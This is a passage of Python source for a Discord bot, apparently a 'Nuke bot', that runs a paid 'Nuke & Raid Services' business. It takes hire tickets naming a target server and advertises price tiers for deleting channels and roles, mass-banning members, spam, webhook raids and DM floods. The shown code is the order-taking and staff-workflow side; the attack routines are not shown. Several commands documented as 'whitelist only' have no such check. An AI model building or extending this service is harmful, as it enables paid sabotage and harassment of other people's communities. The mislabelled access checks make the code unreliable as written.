        title=f"🎫 Hire Ticket  #{t['id']}  —  {_TICKET_ICONS[status]} {status.upper()}",
        color=_TICKET_COLORS[status],
        timestamp=datetime.datetime.utcnow(),
    )
    e.add_field(name="👤 Client",       value=f"<@{t['user_id']}> `{t['user_name']}`", inline=True)
    e.add_field(name="🎯 Target",       value=t["server_name"],   inline=True)
    e.add_field(name="🔗 Invite/ID",    value=t["server_invite"], inline=True)
    e.add_field(name="💳 Payment",      value=t["payment"],       inline=True)
    e.add_field(name="📬 Contact",      value=t["contact"],       inline=True)
    if t.get("handled_by"):
        e.add_field(name="🛡️ Handled by", value=t["handled_by"],  inline=True)
    e.add_field(name="📝 Details",      value=t["details"][:1020], inline=False)
    if t.get("note"):
        e.add_field(name="💬 Staff Note", value=t["note"][:512],  inline=False)
    e.set_footer(text=f"Ticket #{t['id']} • Created {t['created_at'][:10]}")
    return e


async def _create_ticket_channel(t: dict) -> discord.TextChannel | None:
    """Create a private ticket channel inside the hire guild category."""
    guild = bot.get_guild(HIRE_GUILD_ID)
    if not guild:
        return None

    # Find or create the Hire Tickets category
    category = discord.utils.get(guild.categories, name=HIRE_CAT_NAME)
    if not category:
        try:
            category = await guild.create_category(HIRE_CAT_NAME)
        except Exception:
            return None

    # Build a clean channel name
    raw = t["user_name"].split("#")[0]
    clean = "".join(c if (c.isalnum() or c == "-") else "-" for c in raw.lower())[:20].strip("-") or "user"
    ch_name = f"ticket-{t['id']}-{clean}"

    try:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            guild.me:           discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True),
        }
        # Give the client view access if they're a member of this guild
        member = guild.get_member(t["user_id"])
        if member:
            overwrites[member] = discord.PermissionOverwrite(view_channel=True, send_messages=True)

        return await guild.create_text_channel(
            ch_name,
            category=category,
            overwrites=overwrites,
            topic=f"Hire ticket #{t['id']} — {t['server_name']} | Client: {t['user_name']}",
            reason=f"Hire ticket #{t['id']}",
        )
    except Exception:
        return None


async def _post_hire_ticket(t: dict):
    """Create a ticket channel in the hire guild AND optionally post to fallback channel."""
    view = _HireTicketView(t["id"])

    # Primary: dedicated ticket channel in the hire guild
    ch = await _create_ticket_channel(t)
    if ch:
        t["ticket_channel_id"] = ch.id
        _save_tickets()
        await safe(ch.send(embed=_ticket_embed(t), view=view))
        # Pin the ticket embed so it stays at the top
        try:
            msgs = [m async for m in ch.history(limit=1)]
            if msgs:
                await msgs[0].pin()
        except Exception:
            pass

    # Fallback: post summary to HIRE_CHANNEL_ID if configured
    if HIRE_CHANNEL_ID:
        fallback = bot.get_channel(HIRE_CHANNEL_ID)
        if fallback:
            mention = ch.mention if ch else "*(channel creation failed)*"
            fb = discord.Embed(
                title=f"🎫 New Ticket #{t['id']} — {t['server_name']}",
                description=f"Ticket channel: {mention}",
                color=0xffd700,
            )
            fb.add_field(name="Client",  value=t["user_name"],  inline=True)
            fb.add_field(name="Status",  value="🟡 Pending",    inline=True)
            await safe(fallback.send(embed=fb))


async def _notify_requester(t: dict):
    """DM the ticket author with their updated ticket status."""
    try:
        user = bot.get_user(t["user_id"]) or await bot.fetch_user(t["user_id"])
        status = t["status"]
        msgs = {
            "accepted": "✅ Your hire request has been **accepted**! Our staff will contact you shortly.",
            "denied":   "❌ Your hire request has been **denied**. You may submit a new request.",
            "closed":   "🔒 Your hire ticket has been **closed**. Thank you for working with us!",
        }
        ue = discord.Embed(
            title=f"📋 Ticket #{t['id']} — {status.upper()}",
            description=msgs.get(status, "Your ticket has been updated."),
            color=_TICKET_COLORS.get(status, 0x99aab5),
        )
        if t.get("note"):
            ue.add_field(name="💬 Staff note", value=t["note"], inline=False)
        ue.set_footer(text=f"Use !hirestatus {t['id']} anytime")
        await user.send(embed=ue)
    except Exception:
        pass


# ─── Deny reason modal ─────────────────────────────────────────────

class _DenyReasonModal(discord.ui.Modal, title="Deny Ticket — Add Reason"):
    reason = discord.ui.TextInput(
        label="Reason (optional)",
        style=discord.TextStyle.paragraph,
        required=False,
        max_length=500,
    )

    def __init__(self, ticket_id: str, original_msg: discord.Message,
                 parent_view: "discord.ui.View"):
        super().__init__()
        self.ticket_id   = ticket_id
        self.original_msg = original_msg
        self.parent_view  = parent_view

    async def on_submit(self, interaction: discord.Interaction):
        t = TICKETS["tickets"].get(self.ticket_id)
        if not t:
            await interaction.response.send_message("❌ Ticket not found.", ephemeral=True)
            return
        t["status"]     = "denied"
        t["handled_by"] = str(interaction.user)
        t["note"]       = self.reason.value or ""
        _save_tickets()

        # Disable buttons, update embed
        for item in self.parent_view.children:
            item.disabled = True
        await self.original_msg.edit(embed=_ticket_embed(t), view=self.parent_view)
        await interaction.response.send_message(
            f"❌ Ticket **#{self.ticket_id}** denied.", ephemeral=True
        )
        await _notify_requester(t)
        await _log_embed(_action_embed("❌ Hire Ticket Denied", 0xff0000, [
            ("Ticket",   f"#{self.ticket_id}",           True),
            ("By",       str(interaction.user),          True),
            ("Reason",   t["note"] or "No reason given", False),
        ]))


# ─── Note modal ────────────────────────────────────────────────────

class _NoteModal(discord.ui.Modal, title="Add Staff Note"):
    note = discord.ui.TextInput(
        label="Note",
        style=discord.TextStyle.paragraph,
        max_length=500,
    )

    def __init__(self, ticket_id: str, original_msg: discord.Message):
        super().__init__()
        self.ticket_id    = ticket_id
        self.original_msg = original_msg

    async def on_submit(self, interaction: discord.Interaction):
        t = TICKETS["tickets"].get(self.ticket_id)
        if not t:
            await interaction.response.send_message("❌ Ticket not found.", ephemeral=True)
            return
        t["note"] = self.note.value
        _save_tickets()
        await self.original_msg.edit(embed=_ticket_embed(t))
        await interaction.response.send_message("✅ Note added.", ephemeral=True)


# ─── Hire ticket action buttons (posted in hire channel) ───────────

class _HireTicketView(discord.ui.View):
    def __init__(self, ticket_id: str):
        super().__init__(timeout=None)
        self.ticket_id = ticket_id

    async def _wl_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id not in WHITELIST:
            await interaction.response.send_message("❌ Whitelist only.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="✅ Accept", style=discord.ButtonStyle.success, row=0)
    async def accept_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._wl_check(interaction): return
        t = TICKETS["tickets"].get(self.ticket_id)
        if not t:
            await interaction.response.send_message("❌ Ticket not found.", ephemeral=True)
            return
        t["status"]     = "accepted"
        t["handled_by"] = str(interaction.user)
        _save_tickets()
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(embed=_ticket_embed(t), view=self)
        await interaction.response.send_message(
            f"✅ Ticket **#{self.ticket_id}** accepted.", ephemeral=True
        )
        await _notify_requester(t)
        await _log_embed(_action_embed("✅ Hire Ticket Accepted", 0x57f287, [
            ("Ticket", f"#{self.ticket_id}",  True),
            ("By",     str(interaction.user), True),
            ("Client", t["user_name"],         True),
        ]))

    @discord.ui.button(label="❌ Deny", style=discord.ButtonStyle.danger, row=0)
    async def deny_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._wl_check(interaction): return
        await interaction.response.send_modal(
            _DenyReasonModal(self.ticket_id, interaction.message, self)
        )

    @discord.ui.button(label="🔒 Close", style=discord.ButtonStyle.secondary, row=0)
    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._wl_check(interaction): return
        t = TICKETS["tickets"].get(self.ticket_id)
        if not t:
            await interaction.response.send_message("❌ Ticket not found.", ephemeral=True)
            return
        t["status"]     = "closed"
        t["handled_by"] = str(interaction.user)
        _save_tickets()
        for item in self.children:
            item.disabled = True
        await interaction.message.edit(embed=_ticket_embed(t), view=self)
        await interaction.response.send_message(
            f"🔒 Ticket **#{self.ticket_id}** closed.", ephemeral=True
        )
        await _notify_requester(t)

    @discord.ui.button(label="💬 Add Note", style=discord.ButtonStyle.secondary, row=1)
    async def note_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._wl_check(interaction): return
        await interaction.response.send_modal(
            _NoteModal(self.ticket_id, interaction.message)
        )

    @discord.ui.button(label="✉️ DM Client", style=discord.ButtonStyle.primary, row=1)
    async def dm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not await self._wl_check(interaction): return
        t = TICKETS["tickets"].get(self.ticket_id)
        if not t:
            await interaction.response.send_message("❌ Ticket not found.", ephemeral=True)
            return
        await interaction.response.send_modal(_ReplyModal(t["user_id"]))


# ─── Hire start view (for !hire command) ───────────────────────────

class _HireStartView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="📋 Submit Hire Request", style=discord.ButtonStyle.danger, emoji="🔥")
    async def open_form(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(_HireModal())


# ─── Hire commands ─────────────────────────────────────────────────

@bot.command()
async def hiresetup(ctx, channel: discord.TextChannel = None):
    """Set the channel where hire tickets are posted (master only)."""
    if ctx.author.id != MASTER_ID:
        await ctx.send("❌ Master only.")
        return
    global HIRE_CHANNEL_ID
    HIRE_CHANNEL_ID = (channel or ctx.channel).id
    await ctx.send(f"✅ Hire tickets will be posted to {(channel or ctx.channel).mention}")
    await _log_embed(_action_embed("⚙️ Hire Channel Set", 0xffd700, [
        ("Channel", str((channel or ctx.channel).id), True),
        ("By", str(ctx.author), True),
    ]))


@bot.command()
async def hire(ctx):
    """Open a hire request form. Anyone can use this."""
    e = discord.Embed(
        title="🔥 Hire Us — Nuke & Raid Services",
        description=(
            "We provide **professional server disruption services**.\n"
            "Click the button below to submit your request — our team reviews every ticket.\n\n"
            "**Payment is collected *after* acceptance — you pay nothing upfront.**"
        ),
        color=0xff4500,
    )
    e.add_field(name="🔥 Basic Nuke",     value="From **$10**",  inline=True)
    e.add_field(name="💣 Raid Package",   value="From **$15**",  inline=True)
    e.add_field(name="⚡ Premium Package", value="From **$25**",  inline=True)
    e.set_footer(text="Submit a request and we'll reach out with next steps.")
    await ctx.send(embed=e, view=_HireStartView())


@bot.command()
async def hireprice(ctx):
    """Show pricing. Anyone can use this."""
    e = discord.Embed(title="💰 Pricing", color=0xffd700)
    _tier_meta = {
        "basic":   ("🔥 Basic Nuke",     "Delete channels, roles, ban members"),
        "raid":    ("💣 Raid Package",    "Mass spam, webhook raids, DM floods"),
        "premium": ("⚡ Premium Package", "Full nuke + raid + custom script"),
        "custom":  ("🎯 Custom Job",      "Tell us exactly what you need"),
    }
    for key, (name, desc) in _tier_meta.items():
        raw = PRICES.get(key, _DEFAULT_PRICES[key])
        price_str = f"**${raw}+**" if str(raw).isdigit() else f"**{raw}**"
        e.add_field(name=name, value=f"{price_str}\n{desc}", inline=False)
    e.set_footer(text="Use !hire to submit a request • Payment after acceptance only")
    await ctx.send(embed=e, view=_HireStartView())


@bot.command()
async def setprice(ctx, tier: str, *, amount: str):
    """Update the price for a hire tier (whitelist only)."""
    tier = tier.lower()
    if tier not in {"basic", "raid", "premium", "custom"}:
        await ctx.send("❌ Valid tiers: `basic`, `raid`, `premium`, `custom`")
        return
    PRICES[tier] = amount
    _save_prices()
    await ctx.send(f"✅ Price for **{tier}** updated to **{amount}**")
    await _log_embed(_action_embed("💰 Price Updated", 0xffd700, [
        ("Tier",      tier,          True),
        ("New Price", str(amount),   True),
        ("By",        str(ctx.author), True),
    ]))


@bot.command()
async def hirelist(ctx):
    """List all hire tickets (whitelist only)."""
    tickets = TICKETS.get("tickets", {})
    if not tickets:
        await ctx.send("📋 No tickets on file.")
        return
    lines = []
    for t in sorted(tickets.values(), key=lambda x: int(x["id"]), reverse=True)[:20]:
        icon   = _TICKET_ICONS.get(t["status"], "❓")
        lines.append(
            f"`#{t['id']}` {icon} **{t['status'].upper()}** — "
            f"{t['server_name']} ← {t['user_name']}"
        )
    e = discord.Embed(title=f"🎫 Hire Tickets ({len(tickets)} total)",
                      description="\n".join(lines), color=0xffd700)
    e.set_footer(text="Showing latest 20 • Use !hireinfo <id> for details")
    await ctx.send(embed=e)


@bot.command()
async def hireinfo(ctx, ticket_id: str):
    """Show full details of a ticket (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    await ctx.send(embed=_ticket_embed(t))


@bot.command()
async def hirestatus(ctx, ticket_id: str):
    """Check the status of your hire ticket. Anyone can use this."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    # Non-whitelist users can only see their own tickets
    if ctx.author.id not in WHITELIST and t["user_id"] != ctx.author.id:
        await ctx.send("❌ You can only check your own tickets.")
        return
    e = discord.Embed(
        title=f"📋 Ticket #{ticket_id} Status",
        color=_TICKET_COLORS.get(t["status"], 0xffd700),
    )
    e.add_field(name="Status",    value=f"{_TICKET_ICONS[t['status']]} {t['status'].upper()}", inline=True)
    e.add_field(name="🎯 Target", value=t["server_name"], inline=True)
    e.add_field(name="📅 Filed",  value=t["created_at"][:10], inline=True)
    if t.get("handled_by"):
        e.add_field(name="🛡️ Handled by", value=t["handled_by"], inline=True)
    if t.get("note"):
        e.add_field(name="💬 Staff note", value=t["note"], inline=False)
    await ctx.send(embed=e)


@bot.command()
async def hireaccept(ctx, ticket_id: str):
    """Accept a hire ticket (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    t["status"]     = "accepted"
    t["handled_by"] = str(ctx.author)
    _save_tickets()
    await ctx.send(embed=_ticket_embed(t))
    await _notify_requester(t)
    await _log_embed(_action_embed("✅ Hire Ticket Accepted", 0x57f287, [
        ("Ticket", f"#{ticket_id}",  True),
        ("By",     str(ctx.author), True),
        ("Client", t["user_name"],   True),
    ]))


@bot.command()
async def hiredeny(ctx, ticket_id: str, *, reason: str = "No reason given"):
    """Deny a hire ticket (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    t["status"]     = "denied"
    t["handled_by"] = str(ctx.author)
    t["note"]       = reason
    _save_tickets()
    await ctx.send(embed=_ticket_embed(t))
    await _notify_requester(t)
    await _log_embed(_action_embed("❌ Hire Ticket Denied", 0xff0000, [
        ("Ticket", f"#{ticket_id}",  True),
        ("By",     str(ctx.author), True),
        ("Reason", reason,           False),
    ]))


@bot.command()
async def hireclose(ctx, ticket_id: str):
    """Close a completed hire ticket (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    t["status"]     = "closed"
    t["handled_by"] = str(ctx.author)
    _save_tickets()
    await ctx.send(embed=_ticket_embed(t))
    await _notify_requester(t)


@bot.command()
async def hirenote(ctx, ticket_id: str, *, note: str):
    """Add or update a staff note on a ticket (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    t["note"] = note
    _save_tickets()
    await ctx.send(f"✅ Note added to ticket **#{ticket_id}**.")


@bot.command()
async def hirecancel(ctx, ticket_id: str):
    """Cancel your own hire ticket."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    if t["user_id"] != ctx.author.id and ctx.author.id not in WHITELIST:
        await ctx.send("❌ You can only cancel your own tickets.")
        return
    t["status"]     = "closed"
    t["handled_by"] = f"Cancelled by {ctx.author}"
    _save_tickets()
    await ctx.send(f"✅ Ticket **#{ticket_id}** has been cancelled.")
    await _notify_requester(t)


@bot.command()
async def hirearch(ctx):
    """Show archived (closed/denied) tickets (whitelist only)."""
    done = [t for t in TICKETS.get("tickets", {}).values()
            if t["status"] in ("closed", "denied")]
    if not done:
        await ctx.send("📋 No archived tickets.")
        return
    lines = []
    for t in sorted(done, key=lambda x: int(x["id"]), reverse=True)[:20]:
        icon = _TICKET_ICONS[t["status"]]
        lines.append(f"`#{t['id']}` {icon} **{t['status'].upper()}** — {t['server_name']}")
    e = discord.Embed(title=f"🗄️ Archived Tickets ({len(done)})",
                      description="\n".join(lines), color=0x99aab5)
    await ctx.send(embed=e)


@bot.command()
async def hiredmclient(ctx, ticket_id: str, *, message_text: str):
    """DM the client of a ticket directly (whitelist only)."""
    t = TICKETS["tickets"].get(ticket_id)
    if not t:
        await ctx.send(f"❌ Ticket `#{ticket_id}` not found.")
        return
    try:
        user = bot.get_user(t["user_id"]) or await bot.fetch_user(t["user_id"])
        e = discord.Embed(
            title=f"📬 Message re: Ticket #{ticket_id}",
            description=message_text,
            color=0x5865F2,
        )
        e.set_footer(text="Reply by DMing this bot")
        await user.send(embed=e)
        await ctx.send(f"✅ Message sent to **{t['user_name']}**.")
        await _log_embed(_action_embed("📤 Staff DM to Client", 0x5865F2, [
            ("Ticket", f"#{ticket_id}",  True),
            ("To",     t["user_name"],   True),
            ("By",     str(ctx.author), True),
            ("Msg",    message_text[:512], False),
        ]))
    except Exception as ex:
        await ctx.send(f"❌ Failed: `{ex}`")


# ─────────────────────────────────────────────
# READY
# ─────────────────────────────────────────────

@bot.event
async def on_ready():
    print(f"Nuke bot ready: {bot.user} | {len(bot.guilds)} guild(s) | {len(WHITELIST)} whitelisted")
    print(f"Whitelist: {sorted(WHITELIST)}")
    print(f"Commands: {len(bot.commands)}")

bot.run(os.getenv("NUKE_TOKEN"))
